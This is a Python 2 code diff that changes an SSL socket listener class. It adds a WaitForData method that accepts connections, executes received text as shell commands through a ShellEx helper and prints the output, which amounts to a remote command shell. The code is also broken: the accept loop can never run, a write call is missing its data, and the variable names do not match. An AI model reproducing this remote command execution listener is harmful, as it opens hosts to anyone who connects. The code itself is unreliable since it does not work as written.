@@ -7,7 +7,6 @@ class SSLlistener:
       self.laddr = laddr
       self.timeout = timeout
 
-
    def CreateSocket(self):
       try:
          self.s = socket.socket()
@@ -23,12 +22,13 @@ class SSLlistener:
 
    def ReadFromSocket(self):
       self.data = self.c.read()
+      self.s.listen(self.timeout)
       return  self.data
 
 
    def WriteToSocket(self,data):
       try:
-         self.c.write(data)
+         print(self.c.write(data))
          return True
       except :
          return False
@@ -51,12 +51,25 @@ class SSLlistener:
       else:   
          print "socket creation failed"
          return False
+   
+   def WaitForData(self):
+	i = 0
+	while i:
+	  self.newsocket, self.fromaddr = self.s.accept()
+	  while self.ReadFromSocket() != 'exit':
+	  	print self.data
+		if self.data != ' ':
+			aShell = ShellEx(self.data)
+			print aShell.GetStdout()
+			self.WriteToSocket()
+		self.CloseSocket()
+		self.StartupServer()
           
      
 if __name__ == '__main__':
    sslear = SSLlistener()
    sslear.StartupServer()
    while 1:
-      while sslear.ReadFromSocket() != '':
-         print(sslear.data)
+	sslear.WaitForData()	 	 
+	
 
